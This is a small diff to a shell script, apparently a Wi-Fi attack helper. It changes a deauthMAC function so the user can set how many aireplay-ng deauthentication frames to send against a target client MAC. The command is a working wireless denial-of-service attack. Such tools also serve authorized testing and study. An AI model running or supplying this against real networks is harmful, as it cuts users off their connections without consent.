@@ -243,7 +243,9 @@ airMonitor() {
 deauthMAC() {
     echo -n "Target MAC: "
     read TGT_MAC
-    aireplay-ng --deauth 1 -c $TGT_MAC -a $WLAN_MAC $WLAN_MON
+    echo -n "Number of Cycles: "
+    read CYC_NUM
+    aireplay-ng --deauth $CYC_NUM -c $TGT_MAC -a $WLAN_MAC $WLAN_MON
 }
 
 ## Helper utility
